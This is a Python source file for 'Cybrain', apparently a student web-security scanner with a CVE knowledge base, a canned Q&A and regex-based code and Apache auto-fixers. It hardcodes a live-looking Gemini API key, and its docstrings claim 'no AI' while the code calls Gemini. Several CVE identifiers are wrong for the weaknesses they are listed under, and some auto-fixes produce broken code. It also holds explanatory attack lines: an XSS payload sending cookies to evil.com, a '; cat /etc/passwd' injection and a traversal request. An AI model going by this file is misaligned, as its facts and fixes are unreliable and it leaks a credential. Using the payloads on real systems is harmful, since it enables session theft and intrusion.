"""
CYBRAIN — Security Analysis Engine
Pure Python — Zero AI API — Zero Quota — Offline
PFE Master 2 — Information Security
"""

import re
import os
import time
import json
from datetime import datetime
import google.generativeai as genai
from dotenv import load_dotenv

load_dotenv()
GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY", "AIzaSyAEkqAgzGttdH8IK3K5dy4c7qV8QTOgXnY")
genai.configure(api_key=GEMINI_API_KEY)

# ── CVE/CWE Knowledge Base ──────────────────────────────────
CVE_DATABASE = {
    "SQL Injection": {
        "cve":    "CVE-2023-23397",
        "cwe":    "CWE-89",
        "cvss":   "9.8",
        "owasp":  "A05:2025 Injection",
        "attack": (
            "Attacker injects ' OR 1=1-- into login form. "
            "Backend executes: SELECT * FROM users WHERE "
            "username='' OR 1=1--' AND password='x'. "
            "Query returns all users. Attacker logs in as admin."
        ),
        "fix_cmd": (
            "Python: cursor.execute("
            "'SELECT * FROM users WHERE id=?', (user_id,))\n"
            "PHP:    $stmt = $pdo->prepare("
            "'SELECT * FROM users WHERE id=?');\n"
            "        $stmt->execute([$id]);\n"
            "Java:   PreparedStatement ps = conn.prepareStatement("
            "'SELECT * FROM users WHERE id=?');\n"
            "        ps.setInt(1, userId);"
        ),
    },
    "XSS": {
        "cve":    "CVE-2023-1829",
        "cwe":    "CWE-79",
        "cvss":   "7.4",
        "owasp":  "A05:2025 Injection",
        "attack": (
            "Attacker inputs: <script>document.location="
            "'https://evil.com?c='+document.cookie</script>. "
            "Victim visits page. Script runs. Session cookie "
            "stolen. Attacker hijacks victim session."
        ),
        "fix_cmd": (
            "Python: from markupsafe import escape\n"
            "        safe = escape(user_input)\n"
            "JS:     element.textContent = input "
            "(NOT innerHTML)\n"
            "PHP:    echo htmlspecialchars($input, ENT_QUOTES)"
        ),
    },
    "Hardcoded Credentials": {
        "cve":    "CWE-798",
        "cwe":    "CWE-798",
        "cvss":   "9.1",
        "owasp":  "A07:2025 Authentication Failures",
        "attack": (
            "Developer commits code to GitHub with "
            "password='admin123'. Attacker searches GitHub "
            "for 'password =' in repo. Finds credentials. "
            "Logs into database directly. Full data breach."
        ),
        "fix_cmd": (
            "Python: import os\n"
            "        pwd = os.environ.get('DB_PASSWORD')\n"
            "JS:     const pwd = process.env.DB_PASSWORD\n"
            "Create .env file:\n"
            "        DB_PASSWORD=your_secure_password\n"
            "Add .env to .gitignore — NEVER commit it"
        ),
    },
    "Command Injection": {
        "cve":    "CVE-2023-44487",
        "cwe":    "CWE-78",
        "cvss":   "10.0",
        "owasp":  "A05:2025 Injection",
        "attack": (
            "Attacker sends: ?host=google.com; cat /etc/passwd. "
            "Backend runs: os.system('ping '+host). "
            "Shell executes: ping google.com; cat /etc/passwd. "
            "System passwords returned to attacker."
        ),
        "fix_cmd": (
            "Python: import subprocess\n"
            "        result = subprocess.run(\n"
            "            ['ping', '-c', '1', host],\n"
            "            shell=False,  # CRITICAL\n"
            "            capture_output=True\n"
            "        )\n"
            "Never use os.system() or shell=True"
        ),
    },
    "Path Traversal": {
        "cve":    "CVE-2021-41773",
        "cwe":    "CWE-22",
        "cvss":   "9.1",
        "owasp":  "A05:2025 Injection",
        "attack": (
            "Attacker requests: /download?file=../../etc/passwd. "
            "Server reads: open('/var/www/../../etc/passwd'). "
            "Returns system password file to attacker."
        ),
        "fix_cmd": (
            "Python: import os\n"
            "        safe = os.path.basename(user_input)\n"
            "        # Only allow specific extensions\n"
            "        allowed = ['.pdf', '.txt', '.jpg']\n"
            "        if not any(safe.endswith(e) "
            "for e in allowed):\n"
            "            raise ValueError('Invalid file')"
        ),
    },
    "Insecure Deserialization": {
        "cve":    "CVE-2019-11358",
        "cwe":    "CWE-502",
        "cvss":   "9.8",
        "owasp":  "A08:2025 Integrity Failures",
        "attack": (
            "Attacker crafts malicious pickle payload. "
            "Sends it as serialized object. "
            "Server deserializes it. "
            "Arbitrary Python code executes on server."
        ),
        "fix_cmd": (
            "Python: import yaml\n"
            "        # WRONG: yaml.load(data)\n"
            "        # RIGHT: yaml.safe_load(data)\n"
            "        data = yaml.safe_load(user_data)\n"
            "Never use pickle.loads() on untrusted data"
        ),
    },
    "Weak Cryptography": {
        "cve":    "CVE-2023-2650",
        "cwe":    "CWE-327",
        "cvss":   "6.5",
        "owasp":  "A04:2025 Cryptographic Failures",
        "attack": (
            "Password hashed with MD5: "
            "md5('password123') = '482c811da5d5b4bc'. "
            "Attacker uses rainbow table lookup. "
            "Hash cracked in seconds. "
            "Original password recovered."
        ),
        "fix_cmd": (
            "Python: import bcrypt\n"
            "        # Hash password:\n"
            "        hashed = bcrypt.hashpw(\n"
            "            pwd.encode(), bcrypt.gensalt()\n"
            "        )\n"
            "        # Verify:\n"
            "        bcrypt.checkpw(pwd.encode(), hashed)"
        ),
    },
    "Debug Mode": {
        "cve":    "CWE-489",
        "cwe":    "CWE-489",
        "cvss":   "5.3",
        "owasp":  "A02:2025 Security Misconfiguration",
        "attack": (
            "App runs with DEBUG=True in production. "
            "Error triggers Werkzeug debugger. "
            "Attacker accesses /console endpoint. "
            "Executes arbitrary Python in browser."
        ),
        "fix_cmd": (
            "Python: DEBUG = os.environ.get(\n"
            "            'DEBUG', 'False'\n"
            "        ) == 'True'\n"
            "Flask:  app.run(debug=False)\n"
            "Set in .env: DEBUG=False"
        ),
    },
    "Missing HTTP Security Headers": {
        "cve":    "CWE-693",
        "cwe":    "CWE-693",
        "cvss":   "6.5",
        "owasp":  "A02:2025 Security Misconfiguration",
        "attack": (
            "No X-Frame-Options header. "
            "Attacker embeds victim site in iframe. "
            "Overlays invisible buttons over real UI. "
            "User clicks fake button. "
            "Triggers unintended action (clickjacking)."
        ),
        "fix_cmd": (
            "Apache .htaccess:\n"
            'Header always set X-Frame-Options "DENY"\n'
            'Header always set X-Content-Type-Options "nosniff"\n'
            'Header always set Content-Security-Policy '
            '"default-src \'self\'"\n'
            'Header always set Strict-Transport-Security '
            '"max-age=31536000"'
        ),
    },
    "Unencrypted HTTP": {
        "cve":    "CWE-319",
        "cwe":    "CWE-319",
        "cvss":   "7.5",
        "owasp":  "A04:2025 Cryptographic Failures",
        "attack": (
            "User connects on public WiFi. "
            "Attacker runs Wireshark network sniffer. "
            "Captures all HTTP traffic in plaintext. "
            "Reads username, password, session tokens. "
            "Takes over user account."
        ),
        "fix_cmd": (
            "1. Get free SSL cert:\n"
            "   certbot --apache -d yourdomain.com\n"
            "2. Redirect HTTP to HTTPS in Apache:\n"
            "   RewriteEngine On\n"
            "   RewriteCond %{HTTPS} off\n"
            "   RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI}"
        ),
    },
}

# ── Severity scoring ─────────────────────────────────────────
SEVERITY_WEIGHT = {
    "CRITICAL": 10,
    "HIGH":      7,
    "MEDIUM":    4,
    "LOW":       1,
    "INFO":      0,
}

# ── Code fix templates ───────────────────────────────────────
CODE_FIX_TEMPLATES = {
    "SQL Injection": {
        "py": [
            (
                r'execute\s*\(\s*(["\'])(.*?)\1\s*%\s*',
                r'execute(\1\2\1, (params,))'
            ),
            (
                r'cursor\.execute\(([^,\)]+)\+([^)]+)\)',
                r'cursor.execute(\1, (\2,))'
            ),
        ],
        "comment": (
            "# SECURITY FIX: Use parameterized query\n"
            "# to prevent SQL injection (CWE-89)"
        ),
    },
    "Debug Mode": {
        "py": [
            (r'DEBUG\s*=\s*True',
             "DEBUG = os.environ.get('DEBUG','False')=='True'"),
            (r'app\.run\s*\(.*?debug\s*=\s*True(.*?)\)',
             r'app.run(debug=False\1)'),
        ],
        "comment": (
            "# SECURITY FIX: Never run debug=True in production\n"
            "# Debug mode exposes Werkzeug console (CWE-489)"
        ),
    },
    "Hardcoded Credentials": {
        "py": [
            (
                r'(password|passwd|secret|api_key)\s*='
                r'\s*(["\'])[^"\']{4,}(["\'])',
                r'\1 = os.environ.get("\1".upper(), "")'
            ),
        ],
        "comment": (
            "# SECURITY FIX: Never hardcode credentials\n"
            "# Use environment variables (CWE-798)"
        ),
    },
    "Command Injection": {
        "py": [
            (
                r'os\.system\s*\((.*?)\)',
                r'subprocess.run(\1, shell=False)'
            ),
            (
                r'subprocess\.call\((.*?)shell=True(.*?)\)',
                r'subprocess.run(\1shell=False\2)'
            ),
        ],
        "comment": (
            "# SECURITY FIX: Never use shell=True\n"
            "# Use subprocess with list args (CWE-78)"
        ),
    },
    "Weak Cryptography": {
        "py": [
            (r'hashlib\.md5\s*\(', 'hashlib.sha256('),
            (r'hashlib\.sha1\s*\(', 'hashlib.sha256('),
        ],
        "comment": (
            "# SECURITY FIX: MD5/SHA1 are broken\n"
            "# Use SHA-256 or bcrypt (CWE-327)"
        ),
    },
}

# ── Apache fix rules ─────────────────────────────────────────
APACHE_FIXES = [
    # Deprecated directives
    (r'Order\s+allow,deny', 'Require all granted'),
    (r'Order\s+deny,allow', 'Require all denied'),
    (r'Allow\s+from\s+all', '# Replaced: Require all granted'),
    (r'Deny\s+from\s+all',  '# Replaced: Require all denied'),

    # Server info disclosure
    (r'ServerSignature\s+On',     'ServerSignature Off'),
    (r'ServerTokens\s+\w+',       'ServerTokens Prod'),

    # Directory listing
    (r'Options\s+Indexes\s+',     'Options -Indexes '),
    (r'Options\s+Indexes$',       'Options -Indexes'),

    # Dangerous methods
    (r'TraceEnable\s+On',         'TraceEnable Off'),

    # DoS risks
    (r'LimitRequestBody\s+0',     'LimitRequestBody 10485760'),

    # Weak SSL protocols
    (
        r'SSLProtocol\s+.*',
        'SSLProtocol -all +TLSv1.2 +TLSv1.3'
    ),

    # Weak ciphers
    (
        r'SSLCipherSuite\s+.*',
        'SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:'
        'ECDHE-RSA-AES128-GCM-SHA256:'
        'ECDHE-ECDSA-AES256-GCM-SHA384:'
        '!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5'
    ),
]

APACHE_HEADERS_TO_ADD = """
# ── Security Headers (added by Cybrain) ────────────────
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
# ────────────────────────────────────────────────────────
"""


class CybrainAgent:
    """
    Pure Python security analysis engine.
    No AI API. No quota. Works offline.
    """

    def __init__(self):
        # AI Initialization
        try:
            self.model = genai.GenerativeModel('gemini-2.0-flash')
            self.ai_active = True
        except Exception:
            self.ai_active = False
        
        self.current_context = {}
        self.chat_history    = []
        print(f"[ENGINE] Cybrain Analysis Engine ready (AI: {self.ai_active}) [OK]")

    def chat(self, user_message, context=None):
        """
        Rule-based security Q&A.
        Answers common security questions from
        built-in knowledge base.
        """
        msg   = user_message.lower().strip()
        reply = self._answer_question(
            msg, context
        )
        self.chat_history.append({
            "q": user_message, "a": reply
        })
        return reply

    def _answer_question(self, msg, context=None):
        """Match question to knowledge base answer."""

        # Context-aware: explain findings
        if context and any(k in msg for k in [
            "finding", "explain", "result",
            "scan", "vulnerability", "found"
        ]):
            return self._explain_context(context)

        # SQL Injection
        if any(k in msg for k in [
            "sql injection", "sqli", "sql"
        ]):
            return (
                "## SQL Injection (CWE-89)\n\n"
                "**What it is:** Attacker inserts SQL "
                "code into input fields to manipulate "
                "the database query.\n\n"
                "**Attack example:**\n"
                "```\n"
                "Input: ' OR 1=1--\n"
                "Query: SELECT * FROM users WHERE "
                "username='' OR 1=1--'\n"
                "Result: Returns ALL users, "
                "bypasses authentication\n"
                "```\n\n"
                "**Fix:**\n"
                "```python\n"
                "# WRONG\n"
                "cursor.execute('SELECT * FROM users "
                "WHERE id=' + user_id)\n\n"
                "# RIGHT — parameterized query\n"
                "cursor.execute(\n"
                "    'SELECT * FROM users WHERE id=?',\n"
                "    (user_id,)\n"
                ")\n"
                "```\n\n"
                "**CVSS Score:** 9.8 CRITICAL\n"
                "**OWASP 2025:** A05 — Injection"
            )

        # XSS
        if any(k in msg for k in [
            "xss", "cross-site scripting",
            "cross site", "script injection"
        ]):
            return (
                "## Cross-Site Scripting (CWE-79)\n\n"
                "**What it is:** Attacker injects "
                "malicious JavaScript that runs in "
                "victims' browsers.\n\n"
                "**Attack example:**\n"
                "```\n"
                "Input: <script>document.location=\n"
                "  'https://evil.com?c='+document.cookie\n"
                "</script>\n"
                "Result: Victim's session cookie stolen\n"
                "```\n\n"
                "**Fix:**\n"
                "```python\n"
                "from markupsafe import escape\n"
                "safe_output = escape(user_input)\n"
                "```\n"
                "```javascript\n"
                "// WRONG\n"
                "element.innerHTML = userInput\n"
                "// RIGHT\n"
                "element.textContent = userInput\n"
                "```\n\n"
                "**CVSS Score:** 7.4 HIGH\n"
                "**OWASP 2025:** A05 — Injection"
            )

        # OWASP Top 10
        if "owasp" in msg:
            return (
                "## OWASP Top 10 — 2025\n\n"
                "| # | Category | Risk |\n"
                "|---|----------|------|\n"
                "| A01 | Broken Access Control | 🔴 HIGH |\n"
                "| A02 | Security Misconfiguration | 🔴 HIGH |\n"
                "| A03 | Software Supply Chain | 🟠 HIGH |\n"
                "| A04 | Cryptographic Failures | 🟠 HIGH |\n"
                "| A05 | Injection (SQLi/XSS) | 🔴 CRITICAL |\n"
                "| A06 | Insecure Design | 🟠 HIGH |\n"
                "| A07 | Authentication Failures | 🔴 CRITICAL |\n"
                "| A08 | Integrity Failures | 🟠 HIGH |\n"
                "| A09 | Logging Failures | 🟡 MEDIUM |\n"
                "| A10 | Exception Mishandling | 🟡 MEDIUM |\n\n"
                "Cybrain scans for all 10 categories "
                "using pure technical detection — "
                "no AI involved in scanning."
            )

        # Security headers
        if any(k in msg for k in [
            "header", "csp", "hsts",
            "x-frame", "content security"
        ]):
            return (
                "## HTTP Security Headers\n\n"
                "Add to Apache `.htaccess`:\n"
                "```apache\n"
                "Header always set "
                "Content-Security-Policy "
                "\"default-src 'self'\"\n"
                "Header always set X-Frame-Options "
                "\"DENY\"\n"
                "Header always set "
                "X-Content-Type-Options \"nosniff\"\n"
                "Header always set "
                "Strict-Transport-Security "
                "\"max-age=31536000\"\n"
                "Header always set Referrer-Policy "
                "\"strict-origin-when-cross-origin\"\n"
                "```\n\n"
                "**Why each matters:**\n"
                "• **CSP** — blocks XSS attacks\n"
                "• **X-Frame-Options** — prevents "
                "clickjacking\n"
                "• **HSTS** — forces HTTPS only\n"
                "• **Referrer-Policy** — hides URLs "
                "from third parties"
            )

        # Severity
        if any(k in msg for k in [
            "critical", "severity", "risk level"
        ]):
            return (
                "## Severity Levels\n\n"
                "| Level | CVSS | Action |\n"
                "|-------|------|--------|\n"
                "| 🔴 CRITICAL | 9.0-10.0 | "
                "Fix immediately — active exploit risk |\n"
                "| 🟠 HIGH | 7.0-8.9 | "
                "Fix this week — serious impact |\n"
                "| 🟡 MEDIUM | 4.0-6.9 | "
                "Fix this month — moderate risk |\n"
                "| 🟢 LOW | 0.1-3.9 | "
                "Fix when possible — minor risk |\n\n"
                "**CRITICAL** means an attacker can "
                "exploit RIGHT NOW with no user "
                "interaction required."
            )

        # Apache
        if any(k in msg for k in [
            "apache", "httpd", "htaccess",
            "config"
        ]):
            return (
                "## Apache Hardening\n\n"
                "**Top 5 Apache fixes:**\n\n"
                "1. **Hide server version:**\n"
                "   ```apache\n"
                "   ServerTokens Prod\n"
                "   ServerSignature Off\n"
                "   ```\n\n"
                "2. **Disable directory listing:**\n"
                "   ```apache\n"
                "   Options -Indexes\n"
                "   ```\n\n"
                "3. **Disable TRACE method:**\n"
                "   ```apache\n"
                "   TraceEnable Off\n"
                "   ```\n\n"
                "4. **Fix SSL protocols:**\n"
                "   ```apache\n"
                "   SSLProtocol -all +TLSv1.2 +TLSv1.3\n"
                "   ```\n\n"
                "5. **Update deprecated directives:**\n"
                "   ```apache\n"
                "   # Old: Order allow,deny / Allow from all\n"
                "   # New: Require all granted\n"
                "   ```"
            )

        # Default — general help
        return (
            "## Cybrain AI Security Engine\n\n"
            "I can answer questions about:\n\n"
            "• **SQL Injection** — how it works + fixes\n"
            "• **XSS** — cross-site scripting attacks\n"
            "• **OWASP Top 10** — 2025 categories\n"
            "• **Security Headers** — what to add\n"
            "• **Apache Hardening** — config fixes\n"
            "• **Severity levels** — what CRITICAL means\n"
            "• **Your scan results** — explain findings\n\n"
            "**Try asking:**\n"
            "*'Explain the findings from my scan'*\n"
            "*'What is SQL injection?'*\n"
            "*'How do I fix XSS?'*"
        )

    def _explain_context(self, context):
        """Generate analysis from scan context."""
        if not context:
            return (
                "No scan context available. "
                "Run a scan first then ask me to "
                "explain the findings."
            )

        total  = context.get('total', 0)
        risk   = context.get('risk', 'UNKNOWN')
        target = context.get('target', 'unknown')

        if total == 0:
            return (
                f"## Scan Results for {target}\n\n"
                "No vulnerabilities found. "
                "This could mean:\n"
                "• The target is well-secured\n"
                "• The target blocked the scan\n"
                "• Try a different target like "
                "testphp.vulnweb.com"
            )

        risk_advice = {
            "CRITICAL": (
                "🔴 **IMMEDIATE ACTION REQUIRED.** "
                "Critical vulnerabilities can be "
                "exploited right now without "
                "authentication."
            ),
            "HIGH": (
                "🟠 **Fix within 24-48 hours.** "
                "High severity issues represent "
                "serious security risks."
            ),
            "MEDIUM": (
                "🟡 **Fix within 2 weeks.** "
                "Medium severity issues should be "
                "addressed in your next release."
            ),
            "LOW": (
                "🟢 **Fix when convenient.** "
                "Low severity issues are minor "
                "improvements."
            ),
        }.get(risk, "Review findings below.")

        return (
            f"## Security Assessment: {target}\n\n"
            f"**Total findings:** {total}\n"
            f"**Overall risk:** {risk}\n\n"
            f"{risk_advice}\n\n"
            f"**What this means:**\n"
            f"Your scan found {total} security "
            f"issue(s) with an overall risk level "
            f"of **{risk}**.\n\n"
            f"**Recommended actions:**\n"
            f"1. Review CRITICAL and HIGH findings first\n"
            f"2. Click on each finding to see details\n"
            f"3. Follow the remediation steps provided\n"
            f"4. Re-scan after fixes to verify\n\n"
            f"*Use the Export Report button to get "
            f"a detailed PDF report for documentation.*"
        )

    def analyze_findings(self, findings, target,
                         scan_type="web"):
        """
        AI-Powered Analysis using Gemini.
        Falls back to rule-based if AI fails.
        """
        if not findings:
            return "## No Findings Found\n\nThe scan completed successfully with zero vulnerabilities detected."

        if not self.ai_active:
            return self._analyze_findings_rule_based(findings, target, scan_type)

        prompt = f"""
        Role: Cybrain Security Intelligence Engine
        Task: Analyze the following vulnerability findings for {target}.
        
        Findings:
        {json.dumps(findings, indent=2)}
        
        Requirements:
        1. Provide a professional executive summary.
        2. Analyze the attack surface and potential attack chains.
        3. Provide detailed remediation advice with code examples.
        4. Focus on OWASP Top 10 2025 compliance.
        5. Format as high-quality Markdown.
        """
        
        try:
            response = self.model.generate_content(prompt)
            return response.text
        except Exception as e:
            print(f"[ENGINE] Gemini analysis failed: {e}")
            return self._analyze_findings_rule_based(findings, target, scan_type)

    def _analyze_findings_rule_based(self, findings, target, scan_type):
        """Original rule-based analysis logic (fallback)."""

        # Count by severity
        counts = {}
        for f in findings:
            sev = f.get("severity", "INFO")
            counts[sev] = counts.get(sev, 0) + 1

        # Calculate security score
        total_weight = sum(
            SEVERITY_WEIGHT.get(
                f.get("severity","INFO"), 0
            )
            for f in findings
        )
        score = max(0, 100 - min(total_weight * 3, 95))

        # Overall risk
        risk = "INFO"
        for s in ["CRITICAL","HIGH","MEDIUM","LOW"]:
            if counts.get(s, 0) > 0:
                risk = s
                break

        # Build report sections
        now = datetime.now().strftime(
            "%Y-%m-%d %H:%M"
        )

        # Executive summary
        exec_summary = self._build_exec_summary(
            findings, counts, risk, target
        )

        # Critical risk analysis
        critical_findings = [
            f for f in findings
            if f.get("severity") == "CRITICAL"
        ]
        high_findings = [
            f for f in findings
            if f.get("severity") == "HIGH"
        ]

        critical_section = ""
        if critical_findings:
            items = "\n".join([
                f"• **{f.get('code','')}** — "
                f"{self._get_attack_desc(f.get('code',''))}"
                for f in critical_findings[:5]
            ])
            critical_section = (
                f"## 2. CRITICAL RISK ANALYSIS\n\n"
                f"{items}\n\n"
                f"**Immediate business impact:** "
                f"Data breach, service disruption, "
                f"regulatory fines (GDPR up to "
                f"€20M or 4% annual revenue).\n\n"
            )
        else:
            critical_section = (
                "## 2. CRITICAL RISK ANALYSIS\n\n"
                "No CRITICAL vulnerabilities found. "
                "Address HIGH findings as priority.\n\n"
            )

        # Top 5 fixes
        top_fixes = self._build_top_fixes(findings)

        # Compliance impact
        compliance = self._build_compliance(
            counts, findings
        )

        return (
            f"# Security Assessment Report\n\n"
            f"**Target:** {target}\n"
            f"**Date:** {now}\n"
            f"**Scan type:** {scan_type.upper()}\n\n"
            f"---\n\n"
            f"{exec_summary}\n\n"
            f"{critical_section}"
            f"## 3. ATTACK CHAIN SCENARIO\n\n"
            f"{self._build_attack_chain(findings)}\n\n"
            f"## 4. TOP 5 PRIORITY FIXES\n\n"
            f"{top_fixes}\n\n"
            f"{compliance}\n\n"
            f"## 6. SECURITY SCORE\n\n"
            f"**Score: {score}/100**\n\n"
            f"{self._score_explanation(score, counts)}"
        )

    def _build_exec_summary(self, findings,
                             counts, risk, target):
        n = len(findings)
        c = counts.get('CRITICAL', 0)
        h = counts.get('HIGH', 0)

        if risk == "CRITICAL":
            urgency = (
                "requires IMMEDIATE remediation. "
                f"The {c} critical vulnerability(ies) "
                "can be actively exploited"
            )
        elif risk == "HIGH":
            urgency = (
                "requires urgent attention. "
                f"The {h} high-severity issue(s) "
                "pose serious security risks"
            )
        else:
            urgency = "should be reviewed and addressed"

        return (
            f"## 1. EXECUTIVE SUMMARY\n\n"
            f"Security assessment of **{target}** "
            f"identified **{n} vulnerability(ies)** "
            f"with overall risk level **{risk}**. "
            f"This {urgency}. "
            f"Breakdown: "
            f"{counts.get('CRITICAL',0)} Critical, "
            f"{counts.get('HIGH',0)} High, "
            f"{counts.get('MEDIUM',0)} Medium, "
            f"{counts.get('LOW',0)} Low."
        )

    def _get_attack_desc(self, vuln_name):
        """Get attack description for vulnerability."""
        for key, data in CVE_DATABASE.items():
            if key.lower() in vuln_name.lower():
                return data["attack"][:120] + "..."
        return (
            "Can be used to compromise the system "
            "or expose sensitive data."
        )

    def _build_top_fixes(self, findings):
        """Build prioritized fix list."""
        seen  = set()
        fixes = []
        order = [
            "CRITICAL", "HIGH", "MEDIUM", "LOW"
        ]

        for sev in order:
            for f in findings:
                if f.get("severity") != sev:
                    continue
                code = f.get("code", "")
                if code in seen:
                    continue
                seen.add(code)

                fix_cmd = ""
                for key, data in CVE_DATABASE.items():
                    if key.lower() in code.lower():
                        fix_cmd = data["fix_cmd"]
                        break

                fixes.append(
                    f"**{len(fixes)+1}. [{sev}] "
                    f"{code}**\n"
                    f"```\n{fix_cmd}\n```\n"
                    if fix_cmd else
                    f"**{len(fixes)+1}. [{sev}] "
                    f"{code}**\n"
                    f"Review the finding details "
                    f"for remediation steps.\n"
                )
                if len(fixes) >= 5:
                    break
            if len(fixes) >= 5:
                break

        return "\n".join(fixes) if fixes else (
            "No actionable fixes identified."
        )

    def _build_attack_chain(self, findings):
        """Build realistic attack scenario."""
        sevs = [
            f.get("severity", "INFO")
            for f in findings
        ]

        if "CRITICAL" in sevs:
            return (
                "A sophisticated attacker would:\n\n"
                "1. **Reconnaissance** — Scan target "
                "ports and identify technology stack\n"
                "2. **Initial Access** — Exploit "
                "CRITICAL vulnerability for first "
                "foothold\n"
                "3. **Credential Theft** — Use "
                "injection vulnerabilities to extract "
                "database credentials\n"
                "4. **Lateral Movement** — Use stolen "
                "credentials to access other systems\n"
                "5. **Data Exfiltration** — Extract "
                "sensitive data over encrypted channel\n\n"
                "**Time to compromise:** "
                "Potentially under 30 minutes"
            )
        elif "HIGH" in sevs:
            return (
                "An attacker would:\n\n"
                "1. **Scan** — Identify HIGH severity "
                "misconfigurations\n"
                "2. **Exploit** — Use exposed services "
                "or missing security controls\n"
                "3. **Persist** — Establish backdoor "
                "via insecure upload or config\n\n"
                "**Time to compromise:** "
                "Hours to days depending on skill"
            )
        else:
            return (
                "Low-to-medium severity findings "
                "typically require additional "
                "vulnerabilities to chain together "
                "for significant impact.\n\n"
                "Maintain regular security reviews "
                "to prevent escalation."
            )

    def _build_compliance(self, counts, findings):
        """Build compliance impact section."""
        has_critical = counts.get("CRITICAL", 0) > 0
        has_high     = counts.get("HIGH", 0) > 0

        gdpr   = "⚠️ VIOLATION RISK" if has_critical else "✓ Monitor"
        pci    = "⚠️ FAIL"           if has_critical or has_high else "✓ Review"
        iso    = "⚠️ NON-CONFORMITY" if has_high     else "✓ Minor gaps"
        hipaa  = "⚠️ VIOLATION"      if has_critical else "✓ Review"

        return (
            f"## 5. COMPLIANCE IMPACT\n\n"
            f"| Standard | Status | Reason |\n"
            f"|----------|--------|--------|\n"
            f"| GDPR | {gdpr} | Data breach risk |\n"
            f"| PCI-DSS | {pci} | Payment data exposure |\n"
            f"| ISO 27001 | {iso} | Security controls gap |\n"
            f"| HIPAA | {hipaa} | Protected health data |\n\n"
            f"*Consult a compliance expert for "
            f"formal assessment.*"
        )

    def _score_explanation(self, score, counts):
        if score >= 90:
            return (
                "Excellent security posture. "
                "Minor improvements recommended."
            )
        elif score >= 70:
            return (
                "Good baseline but improvements needed. "
                "Address HIGH findings as priority."
            )
        elif score >= 50:
            return (
                "Significant security gaps. "
                "Multiple vulnerabilities need "
                "immediate attention."
            )
        else:
            return (
                "Critical security posture. "
                "Immediate remediation required. "
                "System may already be compromised."
            )

    def fix_code(self, content, filename,
                 language=None):
        """
        Apply automatic code fixes using regex
        templates. No AI — pure rule-based fixing.
        """
        ext  = filename.split(".")[-1].lower()
        lang = language or ext
        fixed        = content
        changes_made = []
        added_imports = []

        for vuln_name, rules in (
            CODE_FIX_TEMPLATES.items()
        ):
            patterns = rules.get(lang, [])
            if not patterns:
                # Try Python patterns as fallback
                patterns = rules.get("py", [])

            for old_pat, new_val in patterns:
                if re.search(
                    old_pat, fixed, re.IGNORECASE
                ):
                    comment = rules.get("comment", "")
                    # Add comment before the fix
                    fixed = re.sub(
                        old_pat,
                        f"# CYBRAIN FIX: {vuln_name}\n"
                        f"{new_val}",
                        fixed,
                        flags=re.IGNORECASE
                    )
                    changes_made.append(
                        f"✓ Fixed: {vuln_name}"
                    )

        # Add missing imports if needed
        if "subprocess" in fixed and (
            "import subprocess" not in fixed
        ):
            fixed = "import subprocess\n" + fixed
            added_imports.append("subprocess")

        if "os.environ" in fixed and (
            "import os" not in fixed
        ):
            fixed = "import os\n" + fixed
            added_imports.append("os")

        if not changes_made:
            changes_made = [
                "No automatic fixes available "
                "for this file. Review manually."
            ]

        explanation = (
            f"## Automatic Code Fix Report\n\n"
            f"**File:** {filename}\n"
            f"**Engine:** Cybrain Static Fixer\n\n"
            f"## CHANGES MADE\n\n"
            + "\n".join(changes_made) +
            (
                f"\n\nAdded imports: "
                f"{', '.join(added_imports)}"
                if added_imports else ""
            ) +
            f"\n\n## FIXED CODE\n\n"
            f"```{lang}\n{fixed}\n```\n\n"
            f"## NOTE\n\n"
            f"This is an automated fix. "
            f"Review all changes before deploying. "
            f"Some complex vulnerabilities may "
            f"require manual review."
        )

        return {
            "explanation": explanation,
            "fixed_code":  fixed,
            "filename":    filename,
            "language":    lang,
        }

    def fix_apache_config(self, config_content,
                          findings):
        """
        Apply rule-based Apache configuration fixes.
        No AI — uses predefined fix rules.
        """
        fixed    = config_content
        changes  = []

        # Apply all fix rules
        for old_pattern, new_value in APACHE_FIXES:
            if re.search(
                old_pattern, fixed,
                re.MULTILINE | re.IGNORECASE
            ):
                fixed = re.sub(
                    old_pattern,
                    new_value,
                    fixed,
                    flags=re.MULTILINE | re.IGNORECASE
                )
                changes.append(
                    f"✓ Fixed: {old_pattern} "
                    f"→ {new_value[:40]}"
                )

        # Add security headers if missing
        needs_headers = all(
            h not in fixed for h in [
                "Content-Security-Policy",
                "X-Frame-Options",
            ]
        )
        if needs_headers:
            # Add before </VirtualHost> or at end
            if "</VirtualHost>" in fixed:
                fixed = fixed.replace(
                    "</VirtualHost>",
                    APACHE_HEADERS_TO_ADD +
                    "\n</VirtualHost>"
                )
            else:
                fixed += "\n" + APACHE_HEADERS_TO_ADD
            changes.append(
                "✓ Added: All security headers"
            )

        # Fix ProxyPass in Directory blocks
        if re.search(
            r'<Directory[^>]+>.*?ProxyPass',
            fixed,
            re.DOTALL | re.IGNORECASE
        ):
            changes.append(
                "⚠️ Manual fix needed: "
                "Move ProxyPass outside <Directory> blocks"
            )

        explanation = (
            f"## Apache Configuration Fix Report\n\n"
            f"**Engine:** Cybrain Config Fixer\n"
            f"**Fixes applied:** {len(changes)}\n\n"
            f"## CHANGES MADE\n\n"
            + "\n".join(changes) +
            f"\n\n## FIXED CONFIGURATION\n\n"
            f"```apache\n{fixed}\n```\n\n"
            f"## IMPORTANT\n\n"
            f"Test the fixed config before deploying:\n"
            f"```bash\n"
            f"apachectl configtest\n"
            f"```"
        )

        return {
            "explanation":  explanation,
            "fixed_config": fixed,
        }

    def analyze_network_findings(self, findings,
                                  recon_data, target):
        """Generate network security report."""
        return self.analyze_findings(
            findings, target, "network"
        )

    def reset_chat(self):
        self.chat_history    = []
        self.current_context = {}
